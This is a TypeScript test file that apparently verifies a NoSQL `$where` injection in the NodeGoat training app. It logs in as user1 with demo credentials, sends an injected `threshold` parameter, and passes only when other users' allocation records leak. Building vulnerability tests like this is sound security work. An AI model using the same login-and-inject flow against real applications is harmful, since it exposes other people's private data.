// Hand-written witness family (Lane 2, Phase 1) for corpus label nodegoat-nosqli-allocations-where
// (the gate case): the `threshold` query parameter is interpolated into a MongoDB `$where` string,
// so a quote ends the comparison and the rest runs as JavaScript in the query.
//
// Logged in as user1, the witness asks for user1's own allocations with an injected threshold and
// passes only when allocations of other users come back. On the safe variant (threshold parsed as
// an integer) the query stays scoped to user1, so every parameter fails.
import { expect } from 'vitest';
import { witness } from '@affidavit/witness';

interface Params {
  payload: string;
}

const OWN_ID = 2; // user1, "John Doe"
const OTHERS = ['Will Smith', 'Node Goat Admin'];

witness<Params>(async ({ payload }, { target }) => {
  expect(target).not.toBeNull();
  const base = target!.url;

  const login = await fetch(`${base}/login`, {
    method: 'POST',
    redirect: 'manual',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ userName: 'user1', password: 'User1_123' }).toString(),
  });
  expect(login.status).toBe(302);
  const cookie = login.headers
    .getSetCookie()
    .map((c) => c.split(';')[0])
    .join('; ');

  const res = await fetch(
    `${base}/allocations/${OWN_ID}?threshold=${encodeURIComponent(payload)}`,
    { headers: { cookie }, redirect: 'manual' },
  );
  expect(res.status).toBe(200);
  const html = await res.text();
  const leaked = OTHERS.filter((name) => html.includes(`Asset Allocations for ${name}`));
  expect(leaked.length).toBeGreaterThan(0);
});
